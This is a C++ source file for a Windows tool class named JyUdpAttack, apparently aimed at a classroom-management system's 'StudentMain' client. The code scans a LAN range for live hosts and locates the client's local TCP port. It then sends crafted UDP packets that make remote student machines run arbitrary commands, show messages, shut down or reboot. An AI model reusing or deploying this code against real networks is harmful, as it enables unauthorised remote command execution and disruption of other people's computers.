#include "stdafx.h"
#include "JyUdpAttack.h"
#include "NetUtils.h"
#include "Logger.h"
#include "App.h"
#include "AppPublic.h"
#include "TrainerWorker.h"
#include "StringHlp.h"

JyUdpAttack* JyUdpAttack::currentJyUdpAttack = nullptr;
extern LoggerInternal* currentLogger;
extern JTApp* currentApp;

JyUdpAttack::JyUdpAttack()
{
    currentJyUdpAttack = this;
}
JyUdpAttack::~JyUdpAttack()
{
    currentJyUdpAttack = nullptr;
}

struct ScanIPSubTask {
    std::list<std::wstring> address;
    JyUdpAttack* inst;
};
struct SendTask {
    std::wstring cmdString;
    std::wstring ip;
    JyUdpAttack* inst;
    DWORD port;
    BYTE data[SEND_BUFFER_SIZE];
};

void JyUdpAttack::ScanNetworkIP(HWND hWnd, std::wstring &start, std::wstring &end, std::wstring& host, std::wstring& current)
{
    saningIPsAddrStart = start;
    saningIPsAddrEnd = end;
	saningIPsReceivehWnd = hWnd;
    saningIPsAddrPrev = host;
    saningIPsAddrCurrent = current;
    if (isSaningIPs) {
        currentLogger->LogWarn(L"Current scan is in progress, please wait");
        return;
    }
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScanNetworkIPThread, this, NULL, NULL);
}
void JyUdpAttack::CheckStudentMainTCPPort(HWND hWnd)
{
    checkStudentMainTCPPortReceivehhWnd = hWnd;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckStudentMainTCPPortThread, this, NULL, NULL);
}
void JyUdpAttack::SendCommand(std::wstring& ip, DWORD port, std::wstring& cmd)
{
    SendTask* task = new SendTask();
    task->cmdString = FormatString(L"[%s:%d] CMD => %s", ip.c_str(), port, cmd.c_str());
    task->ip = ip;
    task->port = port;
    task->inst = this;
    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_CMD], PACK_BUFFER_SIZE);
    memcpy_s(task->data + 100, SEND_BUFFER_SIZE - 100, cmd.data(), cmd.length() * sizeof(wchar_t));

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
}
void JyUdpAttack::SendText(std::wstring& ip, DWORD port, std::wstring& cmd)
{
    SendTask* task = new SendTask();
    task->cmdString = FormatString(L"[%s:%d] MSG => %s", ip.c_str(), port, cmd.c_str());
    task->ip = ip;
    task->port = port;
    task->inst = this;
    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_MSG], PACK_BUFFER_SIZE);
    memcpy_s(task->data + 56, SEND_BUFFER_SIZE - 56, cmd.data(), cmd.length() * sizeof(wchar_t));

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
}
void JyUdpAttack::SendShutdown(std::wstring& ip, DWORD port)
{
    SendTask* task = new SendTask();
    task->cmdString = FormatString(L"[%s:%d] => shutdown", ip.c_str(), port);
    task->ip = ip;
    task->port = port;
    task->inst = this;
    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_SHUTDOWN], PACK_BUFFER_SIZE);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
}
void JyUdpAttack::SendReboot(std::wstring& ip, DWORD port)
{
    SendTask* task = new SendTask();
    task->cmdString = FormatString(L"[%s:%d] => reboot", ip.c_str(), port);
    task->ip = ip;
    task->port = port;
    task->inst = this;
    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_REBOOT], PACK_BUFFER_SIZE);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
}

void JyUdpAttack::TaskFeedbackMessage(struct SendTask* task, std::wstring* msg) {
    *msg = task->cmdString + L" == " + *msg;
    SendMessage(task->inst->sendResultReceivehWnd, WM_MY_SEND_ADD_RESULT, (WPARAM)msg, NULL);
}
DWORD __stdcall JyUdpAttack::SendThread(void* data) {
    auto task = (SendTask*)data;

    TaskFeedbackMessage(task, new std::wstring(L"开始发送"));

    int sockfd;
    struct sockaddr_in dest_addr;
 
    struct in_addr s;
    InetPton(AF_INET, task->ip.c_str(), &s);

    dest_addr.sin_addr.s_addr = s.s_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons((u_short)task->port);

    //发UDP包
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd > 0) {

        int optval = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));

        int sendBytes;
        if ((sendBytes = sendto(sockfd,
            (const char*)task->data, sizeof(task->data), 0,
            (sockaddr*)&dest_addr, sizeof(sockaddr))) == -1)
            TaskFeedbackMessage(task, FormatStringPtr(L"send失败: %d", errno));
        else 
            TaskFeedbackMessage(task, FormatStringPtr(L"发送成功。%d 字节", sendBytes));
           
        closesocket(sockfd);
    }
    else 
        TaskFeedbackMessage(task, FormatStringPtr(L"socket失败: %d", errno));

    delete task;
    return 0;
}
DWORD __stdcall JyUdpAttack::CheckStudentMainTCPPortThread(void* data) {
    auto _this = (JyUdpAttack*)data;

    TrainerWorker* worker = currentApp->GetTrainerWorker();
    DWORD studentMainPid = worker->GetStudentMainPid();

    currentLogger->Log(L"[CheckStudentMainTCPPortThread] StudentMainPid is : %d", studentMainPid);

    if (studentMainPid <= 4) {
        currentLogger->LogError2(L"[CheckStudentMainTCPPortThread] Not found student main pid!");
        SendMessage(_this->checkStudentMainTCPPortReceivehhWnd, WM_MY_GET_SM_TICP_PORT_FINISH, (WPARAM)NOT_FOUND_JY_PORT, NULL);
        return -1;
    }

    DWORD dwSize = sizeof(MIB_TCPTABLE_OWNER_PID);
    PMIB_TCPTABLE_OWNER_PID netProcess = (PMIB_TCPTABLE_OWNER_PID)malloc(sizeof(MIB_TCPTABLE_OWNER_PID));
    memset(netProcess, 0, dwSize);
    if (GetExtendedTcpTable(netProcess, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == ERROR_INSUFFICIENT_BUFFER)
    {
        free(netProcess);

        netProcess = (PMIB_TCPTABLE_OWNER_PID)malloc(dwSize);
        memset(netProcess, 0, dwSize);

        if (GetExtendedTcpTable(netProcess, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR)
        {
            if (netProcess)
            {
                free(netProcess);
                netProcess = NULL;
            }
            currentLogger->LogError2(L"[CheckStudentMainTCPPortThread] GetExtendedTcpTable failed : %d", GetLastError());
            SendMessage(_this->checkStudentMainTCPPortReceivehhWnd, WM_MY_GET_SM_TICP_PORT_FINISH, (WPARAM)FAILED_FOUND_JY_PORT, NULL);
            return 0;
        }
    }

    if (netProcess)
    {
        ULONG addr = 0;
        struct in_addr s;
        InetPton(AF_INET, L"127.0.0.1", &s);

        for (UINT i = 0; i < netProcess->dwNumEntries; i++)
        {
            MIB_TCPROW_OWNER_PID* current = &netProcess->table[i];
            if (current->dwState == MIB_TCP_STATE_LISTEN) {
                //查找TCP连接，本地地址是127.0.0.1
                if (current->dwOwningPid == studentMainPid && current->dwLocalAddr == s.s_addr)
                {
                    SendMessage(_this->checkStudentMainTCPPortReceivehhWnd, WM_MY_GET_SM_TICP_PORT_FINISH, (WPARAM)ntohs((u_short)current->dwLocalPort), NULL);
                    //break;
                }
            }
        }
        currentLogger->Log(L"[CheckStudentMainTCPPortThread] Search finish, count: %d", netProcess->dwNumEntries);
    }
    else {
        currentLogger->LogError2(L"GetExtendedTcpTable failed : %d", GetLastError());
    }
    return 0;
}
DWORD __stdcall JyUdpAttack::ScanNetworkIPThread(JyUdpAttack* inst)
{
	inst->isSaningIPs = true;

    int lastDotIndex = inst->saningIPsAddrStart.find_last_of(L'.');
    std::wstring startIndex = inst->saningIPsAddrStart.substr(lastDotIndex + 1);
    lastDotIndex = inst->saningIPsAddrEnd.find_last_of(L'.');
    std::wstring endIndex = inst->saningIPsAddrEnd.substr(lastDotIndex + 1);

    int startIndexNumber = _wtoi(startIndex.c_str());
    int endIndexNumber = _wtoi(endIndex.c_str());

    if (startIndexNumber < 0) startIndexNumber = 0;
    if (endIndexNumber > 255) startIndexNumber = 255;

    InetPton(AF_INET, inst->saningIPsAddrCurrent.c_str(), &inst->saningIPsAddrLocal);

    std::vector<std::wstring> addressList;

    for (int i = startIndexNumber; i <= endIndexNumber; i++) {
        wchar_t buf[32];
        swprintf_s(buf, L"%s.%d", inst->saningIPsAddrPrev.c_str(), i);
        addressList.push_back(std::wstring(buf));
    }

    WSADATA sock;

    if (WSAStartup(MAKEWORD(2, 2), &sock) == 0)
    {
        int current = 0;
        int count = addressList.size() / 10; if (count < 1) count = 1;
        inst->saningIPsWorkingThread = count;
        for (auto i = 0; i < count; i++) {
            ScanIPSubTask* currentTask = new ScanIPSubTask();
            for(int j = 0; j < 10 && current < (int)addressList.size(); j++, current++)  
                currentTask->address.push_back(addressList[current]);
            currentTask->inst = inst;

            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScanNetworkIPSubTaskThread, currentTask, NULL, NULL);
        }

        while (inst->saningIPsWorkingThread > 0)
            Sleep(200);

        WSACleanup();
    }

	inst->isSaningIPs = false;
	SendMessage(inst->saningIPsReceivehWnd, WM_MY_SCAN_IP_FINISH, NULL, NULL);

    return 0;
}
DWORD __stdcall JyUdpAttack::ScanNetworkIPSubTaskThread(void* data) {
    auto currentTask = (ScanIPSubTask*)data;
    for (std::wstring ip : currentTask->address)
    {
        wchar_t nameDest[100] = { 0 };
        unsigned char mac[6] = { 0 };
        std::wstring hostName;

        if (NetUtils::GetMacByIP(ip.c_str(), currentTask->inst->saningIPsAddrLocal.s_addr, mac))
        {
            swprintf_s(nameDest, L" %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
                (UINT)(mac[0]), (UINT)mac[1], (UINT)mac[2], (UINT)mac[3], (UINT)mac[4], (UINT)mac[5]);

            JyNetworkIP* data = new JyNetworkIP();
            data->hostName = nameDest;
            data->ipAddress = ip.c_str();
            SendMessage(currentTask->inst->saningIPsReceivehWnd, WM_MY_SCAN_IP_ADD, (WPARAM)data, NULL);
        }
    }

    currentTask->inst->saningIPsLock.Lock();
    currentTask->inst->saningIPsWorkingThread--;
    currentTask->inst->saningIPsLock.UnLock();

    delete currentTask;
    return 0;
}


